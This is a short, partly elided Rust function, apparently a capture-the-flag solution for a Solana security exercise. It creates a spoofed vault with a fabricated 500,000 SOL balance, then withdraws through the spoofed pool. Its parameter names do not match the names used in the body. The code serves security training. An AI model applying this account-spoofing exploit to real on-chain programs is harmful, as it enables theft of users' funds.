...
fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
    let seed: u8 = 1;
    let vault_address = Pubkey::create_program_address(&[&[seed]], &challenge.tip_program).unwrap();
    let a_lot_of_money = sol_to_lamports(500_000.0);
    ...
    let tx = env.execute_as_transaction(
        &[level3::initialize(
            ...
            seed,
            a_lot_of_money as f64,
            challenge.vault_address,
        )],
        &[&challenge.hacker],
    );

    tx.print_named("Creating Spoofed Vault");
    ...
    tx.print_named("Withdrawing with spoofed pool");
}
